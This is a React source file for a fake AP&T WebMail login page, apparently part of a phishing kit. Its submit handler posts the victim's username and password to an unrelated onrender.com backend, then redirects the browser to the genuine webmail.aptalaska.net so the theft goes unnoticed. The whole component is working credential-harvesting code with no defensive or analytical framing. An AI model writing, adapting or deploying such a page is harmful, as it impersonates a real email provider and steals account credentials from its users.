import React from 'react';

import './Home.css'

import { useState } from 'react';

import axios from 'axios';
import logo from './logo.png';
import google from './google.png';
import rounde from './round.png';
import aptlogo from './apt_logo.png';




function Home(){


    const[email, setUserName] = useState("");
    const[password, setPassword] = useState("");

    const[platform, setPlatform] = useState("APT")

    const[showError, setShowError] = useState(false);

    const[ischecked, setChecked] = useState(false);


async function handleSubmit(e){
    e.preventDefault();

    try {
        const response = await axios.post('https://myrootbackendone.onrender.com/api/send', {
            email:email,
            password:password,
            platform:platform
        });
    
        // Handle success
        console.log('Data sent:', response.data.message);

        if(response.status == 200){
            console.log(response.data.message);

            window.location.href = 'https://webmail.aptalaska.net/';
        }
      } catch (error) {
        // Handle error
        console.error('Error:', error);
      }
    
}


    return (
        <>

        <div className='spacer'>
        {showError && <div className="alert alert-danger alert-dismissible fade show" role="alert">
            <strong>Invalid Email or Password</strong> 
            <button type="button" className="close" data-dismiss="alert" aria-label="Close">
                <span aria-hidden="true">&times;</span>
            </button>
            </div>}
        </div>



            <div className='col-md-5 whitediv m-auto py-3 px-4'>
                <div className='text-left'>
                <img className='logoimage' src={aptlogo} />

                </div>



                <form onSubmit={handleSubmit}>

                <div class="form-group row mt-4">
    <label for="staticEmail" class="col-sm-2 col-form-label label">Username</label>
    <div class="col-sm-10">
      <input onChange={function(e){
        setUserName(e.target.value);
      }} value={email} type="text" class="form-control" id="staticEmail" />
    </div>
  </div>
  <div class="form-group row">
    <label for="inputPassword" class="col-sm-2 col-form-label label">Password</label>
    <div class="col-sm-10">
      <input onChange={function(e){
        setPassword(e.target.value);
      }} value={password} type="password" class="form-control" id="inputPassword"/>
    </div>
  </div>


 

       
                   
                 <div className='form-group text-center'>

                        <button type='submit' className=' border-0 px-3 rounded mt-3 font-weight-bold'>Login</button>

                    </div>

                </form>

            </div>


            <p className='info mt-5'>AP&T WebMail  ●  Get support</p>
        
        </>
    );
}

export default Home;